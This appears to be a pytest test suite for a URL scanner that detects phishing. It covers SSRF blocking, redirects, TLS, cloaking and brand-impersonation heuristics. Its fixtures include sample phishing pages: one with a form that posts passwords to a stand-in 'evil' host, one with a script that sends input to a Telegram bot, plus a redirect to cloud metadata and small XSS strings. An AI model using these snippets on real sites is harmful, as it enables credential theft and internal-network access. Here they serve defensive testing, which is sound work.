"""Havola skaneri testlari. Tashqi tarmoq KERAK EMAS: haqiqiy HTTP/TLS serverlar 127.0.0.1 da ko'tariladi,
SSRF himoyasi esa o'z holicha tekshiriladi (faqat kerakli joyda loopback vaqtincha ruxsat etiladi)."""
import base64
import datetime as dt
import http.server
import ipaddress
import json
import ssl
import tempfile
import threading
import time
from contextlib import contextmanager
from io import BytesIO
from unittest import mock

import pytest

from app.errors import ChatError
from app.services import urlscan as U

REAL_IP_OK = U._ip_ok


def _loop_ok(ip):
    return str(ip) == "127.0.0.1" or REAL_IP_OK(ip)


@contextmanager
def allow_loopback():
    with mock.patch.object(U, "_ip_ok", _loop_ok):
        yield


PAGE = b"""<html><head><title>  Kirish &amp; Tasdiqlash </title><meta http-equiv="refresh" content="30"></head>
<body><form action="https://evil.example.net/steal"><input type="password" name="p"></form></body></html>"""


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/a":
            self.send_response(302); self.send_header("Location", "/b"); self.end_headers()
        elif self.path == "/b":
            self.send_response(301); self.send_header("Location", "/page"); self.end_headers()
        elif self.path == "/page":
            self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(PAGE))); self.end_headers(); self.wfile.write(PAGE)
        elif self.path == "/loop":
            self.send_response(302); self.send_header("Location", "/loop"); self.end_headers()
        elif self.path == "/internal":
            self.send_response(302); self.send_header("Location", "http://169.254.169.254/latest/meta-data/"); self.end_headers()
        elif self.path == "/app.apk":
            self.send_response(200); self.send_header("Content-Type", "application/vnd.android.package-archive")
            self.send_header("Content-Length", "4"); self.end_headers(); self.wfile.write(b"PK\x03\x04")
        else:
            self.send_response(404); self.end_headers()


@contextmanager
def http_server():
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    with mock.patch.object(U, "PORTS_OK", set(U.PORTS_OK) | {port}), allow_loopback():
        try:
            yield port
        finally:
            srv.shutdown()
            srv.server_close()


def _self_signed(cn="localhost", days_valid=30, expired=False):
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = dt.datetime.now(dt.timezone.utc)
    nb, na = (now - dt.timedelta(days=60), now - dt.timedelta(days=30)) if expired else (now - dt.timedelta(days=1), now + dt.timedelta(days=days_valid))
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(nb).not_valid_after(na).add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False).sign(key, hashes.SHA256()))
    d = tempfile.mkdtemp()
    cp, kp = f"{d}/c.pem", f"{d}/k.pem"
    open(cp, "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(kp, "wb").write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    return cp, kp


@contextmanager
def tls_server(**kw):
    import socket
    cp, kp = _self_signed(**kw)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cp, kp)
    ls = socket.socket()
    ls.bind(("127.0.0.1", 0)); ls.listen(5); ls.settimeout(0.2)
    port = ls.getsockname()[1]
    stop = threading.Event()

    def run():
        while not stop.is_set():
            try:
                c, _ = ls.accept()
            except OSError:
                continue
            try:
                with ctx.wrap_socket(c, server_side=True) as s:
                    s.recv(1)
            except Exception:
                pass
    th = threading.Thread(target=run, daemon=True); th.start()
    try:
        with allow_loopback():
            yield port
    finally:
        stop.set(); th.join(1); ls.close()


# ------------------------------------------------------------------------------ URL va SSRF


def test_parse_target_variants():
    t = U.parse_target("example.com/path?q=1#frag")
    assert t.url == "https://example.com/path?q=1" and t.port == 443 and not t.userinfo
    t = U.parse_target("HTTP://Example.COM:8080")
    assert t.url == "http://example.com:8080/" and t.port == 8080 and t.port_ok
    t = U.parse_target("https://user:pw@example.com/")
    assert t.userinfo and "user" not in t.url
    t = U.parse_target("https://bücher.de/")
    assert t.host == "xn--bcher-kva.de" and t.uhost == "bücher.de"
    t = U.parse_target("https://www.instagram.com/reel/DWT9EwziPy7/")
    assert t.host == "www.instagram.com" and t.path == "/reel/DWT9EwziPy7/"
    assert U.parse_target("http://[2001:4860:4860::8888]/").is_ip


def test_parse_target_rejects():
    for bad in ["", "   ", "ftp://example.com", "javascript:alert(1)", "https://", "https://exa mple.com", "http://2130706433/", "http://0x7f.1/",
                "https://" + "a" * 300 + ".com", "x" * 2100, "https://example.com:99999/"]:
        with pytest.raises(ChatError):
            U.parse_target(bad)


def test_ssrf_blocks_private_addresses():
    for h in ["localhost", "127.0.0.1", "10.1.2.3", "192.168.0.1", "172.16.5.5", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1"]:
        with pytest.raises(U.ScanBlocked):
            U.resolve_public(h, 80)
    with pytest.raises(U.ScanBlocked):
        U.http_request("http://169.254.169.254/latest/meta-data/")
    with pytest.raises(U.ScanBlocked):
        U.http_request("http://example.com:22/")   # nostandart port


def test_scan_refuses_internal_target():
    with pytest.raises(ChatError) as e:
        U.scan("http://127.0.0.1/admin")
    assert e.value.status == 400
    with pytest.raises(ChatError):
        U.scan("http://localhost:8080/")


def test_redirect_into_internal_network_is_blocked():
    # loopback faqat test serveri uchun ochiq; redirect ko'rsatgan 169.254.169.254 (bulut metadata) baribir bloklanishi shart
    with http_server() as port:
        with pytest.raises(U.ScanBlocked):
            U.http_request(f"http://127.0.0.1:{port}/internal", max_hops=5)


# --------------------------------------------------------------------------------- Haqiqiy fetch


def test_follow_redirects_and_page_analysis():
    with http_server() as port:
        r = U.http_request(f"http://127.0.0.1:{port}/a", max_hops=8)
        assert r.status == 200 and r.url.endswith("/page")
        assert [h["status"] for h in r.hops] == [302, 301, 200]
        pa = U.page_analysis(r)
        assert pa["title"] == "Kirish & Tasdiqlash" and pa["password"] and pa["meta_refresh"]
        assert pa["ext_form"] == ["evil.example.net"] and pa["download"] == ""


def test_redirect_loop_is_cut():
    with http_server() as port:
        r = U.http_request(f"http://127.0.0.1:{port}/loop", max_hops=4)
        assert r.too_many and len(r.hops) == 5


def test_download_detected():
    with http_server() as port:
        r = U.http_request(f"http://127.0.0.1:{port}/app.apk")
        assert U.page_analysis(r)["download"] == "exe"


def test_body_limit():
    with http_server() as port:
        r = U.http_request(f"http://127.0.0.1:{port}/page", max_bytes=50)
        assert len(r.body) == 50


# ----------------------------------------------------------------------------------------- TLS


def test_tls_self_signed_is_reported():
    with tls_server() as port:
        info = U.tls_step("localhost", port)
    assert info["verified"] is False and "self" in info["error"].lower()
    assert info["subject"] == "localhost" and info["self_signed"] and info["version"].startswith("TLS")
    assert 25 <= (info["not_after"] - dt.datetime.now(dt.timezone.utc)).days <= 31


def test_tls_expired_is_reported():
    with tls_server(expired=True) as port:
        info = U.tls_step("localhost", port)
    assert info["verified"] is False and info["not_after"] < dt.datetime.now(dt.timezone.utc)


# ------------------------------------------------------------------------------------ Evristika


def _texts(url):
    return " | ".join(x["text"] for x in U.heuristics(U.parse_target(url)))


def test_heuristics_brand_and_tricks():
    assert U.heuristics(U.parse_target("https://www.instagram.com/reel/DWT9EwziPy7/")) == []
    assert "instagram" in _texts("https://instagram.com.login-verify.xyz/")
    assert "instagram" in _texts("https://instagram-login.net/")
    assert "taqlid" in _texts("https://paypa1.com/")
    assert "taqlid" in _texts("https://instagrarn.com/")
    assert "login@" in _texts("https://www.instagram.com@evil.com/")
    assert "IP manzil" in _texts("http://8.8.8.8/")
    assert "punycode" in _texts("https://xn--80ak6aa92e.com/")
    assert "Nostandart port (8081)" in _texts("https://example.com:8081/")
    assert U.heuristics(U.parse_target("https://github.com/")) == []
    assert U.heuristics(U.parse_target("https://pineapple.com/")) == []
    assert U.heuristics(U.parse_target("https://mail.google.com/")) == []


def test_registrable_domain():
    assert U.registrable("a.b.example.com") == "example.com"
    assert U.registrable("shop.example.co.uk") == "example.co.uk"
    assert U.registrable("my.site.com.uz") == "site.com.uz"
    assert U.registrable("example.uz") == "example.uz"


def test_age_text_and_dates():
    assert U.age_text(3) == "3 kun" and U.age_text(100) == "3 oy" and U.age_text(800).startswith("2 yil")
    assert U.parse_dt("2020-01-02T03:04:05Z").year == 2020 and U.parse_dt("02-Jan-2020").month == 1 and U.parse_dt("xx") is None


# ----------------------------------------------------------------------------------- Screenshot


def _png(mode="RGBA", size=(1200, 1600)):
    from PIL import Image
    b = BytesIO(); Image.new(mode, size, (10, 120, 200, 128) if mode == "RGBA" else (10, 120, 200)).save(b, "PNG"); return b.getvalue()


def test_process_shot_reencodes_to_small_jpeg():
    r = U._process_shot(_png())
    assert r["ok"] and r["image"].startswith("data:image/jpeg;base64,") and r["w"] <= 720 and r["h"] <= 504
    raw = base64.b64decode(r["image"].split(",", 1)[1])
    assert raw[:2] == b"\xff\xd8"
    assert not U._process_shot(b"<svg onload=alert(1)>")["ok"]
    assert not U._process_shot(b"GIF89a" + b"\x00" * 10)["ok"]


def test_shot_via_provider_and_disabled():
    png = _png("RGB", (900, 600))

    def fake_req(url, **kw):
        assert "https%3A%2F%2Fexample.com%2F" in url or url.endswith("https://example.com/")
        return U.Resp(url=url, status=200, headers={"content-type": "image/png"}, body=png)
    from app.config import settings
    with mock.patch.object(U, "resolve_public", return_value=["93.184.216.34"]), mock.patch.object(U, "http_request", fake_req), \
            mock.patch.object(U, "_cache", U.OrderedDict()), \
            mock.patch.object(U, "settings", type("S", (), {"shot_url": "https://shots.test/get/{url}"})()):
        r = U.shot("https://example.com/")
        assert r["ok"] and r["via"] == "shots.test"
        assert U.shot("https://example.com/") is U._cget(("shot", "https://example.com/"))   # keshdan
    with mock.patch.object(U, "settings", type("S", (), {"shot_url": ""})()):
        assert U.shot("https://example.com/")["reason"] == "off"
    with mock.patch.object(U, "resolve_public", side_effect=U.ScanBlocked("10.0.0.1")), pytest.raises(ChatError):
        U.shot("https://internal.example/")
    assert settings is not None


# ------------------------------------------------------------------------------------ To'liq scan


def _fake_who(t):
    return {"domain": U.registrable(t.host), "source": "RDAP", "created": U._now() - dt.timedelta(days=3), "expires": U._now() + dt.timedelta(days=360),
            "updated": None, "registrar": "Test Registrar", "status": ["active"], "ns": ["ns1.test"], "dnssec": False}


def _fake_dns(t):
    return {"A": ["127.0.0.1"], "AAAA": [], "NS": ["ns1.test"], "MX": [], "ttl": 300, "system": ["127.0.0.1"]}


def test_full_scan_flags_phishing_page_and_is_json_safe():
    with http_server() as port, mock.patch.object(U, "_cache", U.OrderedDict()), \
            mock.patch.object(U, "whois_step", _fake_who), mock.patch.object(U, "dns_step", _fake_dns), \
            mock.patch.object(U, "_threat_feeds", lambda t, u: [{"name": "Cloudflare Security DNS", "state": "clean", "note": "bloklanmagan"},
                                                                {"name": "Quad9 Threat DNS", "state": "na", "note": "javob yo'q"}]):
        res = U.scan(f"http://127.0.0.1:{port}/a")
        json.dumps(res)
        ids = [c["id"] for c in res["checks"]]
        assert ids == ["whois", "dns", "tls", "redirects", "threat", "final", "page", "content", "cloak", "url"]
        by = {c["id"]: c for c in res["checks"]}
        assert by["whois"]["status"] == "bad" and "3 kun" in by["whois"]["value"]
        assert by["redirects"]["value"] == "2 ta" and by["final"]["status"] in ("ok", "warn")
        assert by["page"]["status"] in ("warn", "bad") and res["title"] == "Kirish & Tasdiqlash"
        assert by["threat"]["status"] == "ok"
        assert res["verdict"]["level"] == "bad" and res["verdict"]["score"] >= 40
        assert any("forma" in f["text"].lower() for f in res["findings"])
        assert U.scan(f"http://127.0.0.1:{port}/a") is res   # kesh


def test_full_scan_threat_hit_is_dangerous():
    with http_server() as port, mock.patch.object(U, "_cache", U.OrderedDict()), \
            mock.patch.object(U, "whois_step", lambda t: {"domain": "x.test", "error": "topilmadi"}), mock.patch.object(U, "dns_step", _fake_dns), \
            mock.patch.object(U, "_threat_feeds", lambda t, u: [{"name": "VirusTotal", "state": "hit", "note": "5/90 dvigatel xavfli deb topdi"}]):
        res = U.scan(f"http://127.0.0.1:{port}/page")
        assert res["verdict"]["level"] == "bad"
        assert {c["id"]: c for c in res["checks"]}["threat"]["status"] == "bad"


def test_full_scan_clean_site():
    class Clean(H):
        def do_GET(self):
            body = b"<html><title>Salom</title><body>hi</body></html>"
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body)
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Clean)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    old = _fake_who

    def who(t):
        d = old(t); d["created"] = U._now() - dt.timedelta(days=4000); return d
    try:
        with mock.patch.object(U, "PORTS_OK", set(U.PORTS_OK) | {port}), allow_loopback(), mock.patch.object(U, "_cache", U.OrderedDict()), \
                mock.patch.object(U, "whois_step", who), mock.patch.object(U, "dns_step", _fake_dns), \
                mock.patch.object(U, "_threat_feeds", lambda t, u: [{"name": "Cloudflare Security DNS", "state": "clean", "note": "ok"}]):
            res = U.scan(f"http://127.0.0.1:{port}/")
    finally:
        srv.shutdown(); srv.server_close()
    # 127.0.0.1 IP-host + http uchun ozgina ball, lekin xavfli emas
    assert res["verdict"]["level"] in ("ok", "warn") and res["verdict"]["score"] < 40


def test_scan_nonexistent_domain_is_reported():
    with mock.patch.object(U, "resolve_public", side_effect=U.ScanNoDNS("x")), mock.patch.object(U, "_cache", U.OrderedDict()), \
            mock.patch.object(U, "whois_step", lambda t: {"domain": t.host, "error": "topilmadi"}), \
            mock.patch.object(U, "_threat_feeds", lambda t, u: []):
        res = U.scan("https://this-domain-does-not-exist.example/")
    assert {c["id"]: c for c in res["checks"]}["dns"]["status"] == "bad" and res["verdict"]["level"] in ("warn", "bad")


# ------------------------------------------------------------------ yangi: kontent, cloaking, ASN, tavsiya

KIT = b"""<html><head><title>Instagram - Kirish</title></head><body><form action="/p.php" method="post"><input name="u">
<input type="password" name="p"></form><script>fetch("https://api.telegram.org/bot1:AAA/sendMessage?text="+u)</script></body></html>"""
CLEAN = b"<html><head><title>Salom</title></head><body><p>" + b"Oddiy sahifa matni. " * 40 + b"</p></body></html>"
LOGIN = b"<html><head><title>Bank kirish</title></head><body><form><input name='l'><input type='password' name='p'></form>" + b"x" * 700 + b"</body></html>"


def _serve(handler_cls):
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler_cls)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _send(h, body, status=200):
    h.send_response(status); h.send_header("Content-Type", "text/html; charset=utf-8"); h.send_header("Content-Length", str(len(body)))
    h.end_headers(); h.wfile.write(body)


@contextmanager
def scan_env(handler_cls, *, feeds=None, age_days=4000):
    srv, port = _serve(handler_cls)

    def who(t):
        d = _fake_who(t); d["created"] = U._now() - dt.timedelta(days=age_days); return d
    try:
        with mock.patch.object(U, "PORTS_OK", set(U.PORTS_OK) | {port}), allow_loopback(), mock.patch.object(U, "_cache", U.OrderedDict()), \
                mock.patch.object(U, "whois_step", who), mock.patch.object(U, "dns_step", _fake_dns), \
                mock.patch.object(U, "_threat_feeds", lambda t, u: feeds if feeds is not None else [{"name": "Cloudflare Security DNS", "state": "clean", "note": "ok"}]):
            yield port
    finally:
        srv.shutdown(); srv.server_close()


def test_phishing_kit_page_is_dangerous_with_advice():
    class K(H):
        def do_GET(self): _send(self, KIT)
    with scan_env(K) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    by = {c["id"]: c for c in res["checks"]}
    assert res["verdict"]["level"] == "bad" and by["content"]["status"] == "bad"
    assert any("Telegram bot" in f["text"] for f in res["findings"])
    assert any("kiritmang" in a for a in res["advice"]) and res["good"] == []
    assert res["coverage"]["total"] == 10
    json.dumps(res)


def test_cloaking_scanner_vs_mobile_is_reported():
    class C(H):
        def do_GET(self):
            ua = self.headers.get("User-Agent", "")
            _send(self, LOGIN if "Android" in ua else CLEAN)
    with scan_env(C) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    by = {c["id"]: c for c in res["checks"]}
    assert by["cloak"]["status"] == "warn" and by["cloak"]["value"] == "Farq bor"
    assert any(f["text"].startswith("Cloaking") for f in res["findings"])


def test_same_view_has_no_cloaking_and_clean_site_has_good_signals():
    class S(H):
        def do_GET(self): _send(self, CLEAN)
    with scan_env(S) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    by = {c["id"]: c for c in res["checks"]}
    assert by["cloak"]["status"] == "ok" and by["content"]["status"] == "ok"
    assert res["verdict"]["level"] in ("ok", "warn")


def test_bot_blocking_waf_is_not_called_cloaking_and_mobile_view_is_used():
    class W(H):
        def do_GET(self):
            if "TermChatLinkScanner" in self.headers.get("User-Agent", ""):
                _send(self, b"forbidden", 403)
            else:
                _send(self, CLEAN)
    with scan_env(W) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    by = {c["id"]: c for c in res["checks"]}
    assert by["cloak"]["status"] == "na" and res["title"] == "Salom"
    assert not any(f["text"].startswith("Cloaking") for f in res["findings"])


def test_local_feed_near_and_hit_levels():
    class S(H):
        def do_GET(self): _send(self, CLEAN)
    near = [{"name": "OpenPhish", "state": "near", "note": "shu domenning boshqa sahifasi fishing deb belgilangan"}]
    with scan_env(S, feeds=near) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    assert {c["id"]: c for c in res["checks"]}["threat"]["status"] == "warn" and res["verdict"]["score"] >= 30
    hit = [{"name": "Phishing.Database", "state": "hit", "note": "domen faol fishing bazasida (x.com)"}]
    with scan_env(S, feeds=hit) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    assert res["verdict"]["level"] == "bad"


def test_strong_brand_impersonation_alone_is_dangerous():
    t = U.parse_target("https://instagram.com.login-verify.xyz/")
    assert any(x.get("strong") for x in U.heuristics(t))


def test_new_domain_with_card_form_is_bad():
    CARD = b"<html><title>Tolov</title><body><form><input name='card_number'><input name='cvv'></form>" + b"x" * 700 + b"</body></html>"

    class S(H):
        def do_GET(self): _send(self, CARD)
    with scan_env(S, age_days=3) as port:
        res = U.scan(f"http://127.0.0.1:{port}/")
    assert res["verdict"]["level"] == "bad" and any("karta" in f["text"] for f in res["findings"])


def test_asn_step_parses_cymru_answers():
    answers = {"8.8.8.8.in-addr": None}

    def fake_doh(host, path, name, rtype, port=443):
        if name.endswith(".origin.asn.cymru.com"):
            assert name.startswith("8.8.8.8.")
            return {"Answer": [{"type": 16, "data": '"15169 | 8.8.8.0/24 | US | arin | 1992-12-01"'}]}
        if name == "AS15169.asn.cymru.com":
            return {"Answer": [{"type": 16, "data": '"15169 | US | arin | 2000-03-30 | GOOGLE, US"'}]}
        return None
    with mock.patch.object(U, "_doh", fake_doh):
        r = U.asn_step("8.8.8.8")
    assert r == {"asn": "AS15169", "prefix": "8.8.8.0/24", "country": "US", "name": "GOOGLE, US"}
    with mock.patch.object(U, "_doh", lambda *a, **k: None):
        assert U.asn_step("8.8.8.8") is None
    assert U.asn_step("not-an-ip") is None


def test_concurrent_identical_scans_share_one_run():
    calls = []
    gate = threading.Event()

    def slow(t):
        calls.append(t.url); gate.wait(2)
        return {"ok": True, "url": t.url}
    out = []
    with mock.patch.object(U, "_scan", slow), mock.patch.object(U, "_cache", U.OrderedDict()):
        ths = [threading.Thread(target=lambda: out.append(U.scan("https://dedupe.example/"))) for _ in range(4)]
        for th in ths: th.start()
        time.sleep(0.3); gate.set()
        for th in ths: th.join(3)
    assert len(calls) == 1 and len(out) == 4


def test_http_request_gzip_cap_is_separate_from_read_cap():
    import gzip
    payload = b"d" * 5000
    z = gzip.compress(payload)

    class G(H):
        def do_GET(self):
            self.send_response(200); self.send_header("Content-Encoding", "gzip"); self.send_header("Content-Length", str(len(z)))
            self.end_headers(); self.wfile.write(z)
    srv, port = _serve(G)
    try:
        with mock.patch.object(U, "PORTS_OK", set(U.PORTS_OK) | {port}), allow_loopback():
            r = U.http_request(f"http://127.0.0.1:{port}/", max_bytes=100000, max_out=100000)
            assert r.body == payload
            r = U.http_request(f"http://127.0.0.1:{port}/", max_bytes=100000, max_out=1000)
            assert len(r.body) == 1000
    finally:
        srv.shutdown(); srv.server_close()


# ---------------------------------------------------------------------------------------- API


def test_api_requires_auth_validates_and_limits():
    pytest.importorskip("fastapi")
    pytest.importorskip("httpx")
    from fastapi.testclient import TestClient
    from app.main import app
    from app.security import limiter
    with TestClient(app) as c:
        assert c.post("/api/urlscan", json={"url": "https://example.com/"}).status_code == 401
        assert c.post("/api/urlscan/shot", json={"url": "https://example.com/"}).status_code == 401
        tok = c.post("/api/register", json={"username": "scan_user", "nickname": "S", "password": "secret12"}).json()["token"]
        h = {"Authorization": f"Bearer {tok}"}
        assert c.post("/api/urlscan", headers=h, json={"url": "ftp://x"}).status_code == 400
        assert c.post("/api/urlscan", headers=h, json={"url": "http://127.0.0.1/"}).status_code == 400
        assert c.post("/api/urlscan", headers=h, json={"url": "x" * 3000}).status_code == 422
        with mock.patch.object(U, "scan", return_value={"ok": True, "verdict": {"level": "ok"}}) as m:
            r = c.post("/api/urlscan", headers=h, json={"url": "https://example.com/", "fresh": True})
            assert r.status_code == 200 and m.call_args.args == ("https://example.com/", True)
        limiter._hits.clear()
        with mock.patch.object(U, "scan", return_value={"ok": True}):
            codes = [c.post("/api/urlscan", headers=h, json={"url": "https://example.com/"}).status_code for _ in range(14)]
        assert codes[:12] == [200] * 12 and 429 in codes[12:]
        limiter._hits.clear()
